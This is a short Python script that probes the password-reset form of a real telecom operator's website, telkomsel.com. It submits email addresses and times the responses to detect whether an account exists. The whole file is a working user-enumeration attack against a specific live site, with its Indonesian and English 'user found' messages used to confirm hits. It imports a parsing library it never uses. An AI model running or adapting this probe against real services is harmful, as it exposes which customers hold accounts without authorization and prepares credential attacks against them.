import requests
import time

def probe_reset(email):
    url = "https://www.telkomsel.com/user/password"
    data = {
        'name': email,
        'form_id': 'user_pass',
        'op': 'Submit' # Button text assumption
    }
    # Drupal form usually requires a build_id, we need to fetch it first
    s = requests.Session()
    try:
        r_form = s.get(url, timeout=10)
        from bs4 import BeautifulSoup
        # Fallback regex if bs4 not available
        import re
        form_build_id = re.search(r'name="form_build_id" value="([^"]+)"', r_form.text)
        
        if form_build_id:
            data['form_build_id'] = form_build_id.group(1)
            print(f"[*] Testing email: {email} (Form ID: {data['form_build_id']})")
            
            start = time.time()
            r_post = s.post(url, data=data)
            duration = time.time() - start
            
            print(f"[+] Response Code: {r_post.status_code}")
            print(f"[+] Duration: {duration:.2f}s")
            
            if "Maaf, nama pengguna atau alamat email tidak dikenali" in r_post.text or "Sorry" in r_post.text:
                print("[-] Result: User Not Found message detected.")
            elif "Instruksi pengaturan ulang kata sandi" in r_post.text or "Password reset instructions" in r_post.text:
                print("[!] Result: User FOUND! (Enumeration Vulnerability confirmed)")
            else:
                print("[?] Result: Ambiguous response. Check manually.")
        else:
            print("[-] Failed to extract form_build_id")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    # Test with a non-existent user to baseline
    probe_reset("astro_test_user_nonexistent@gmail.com")
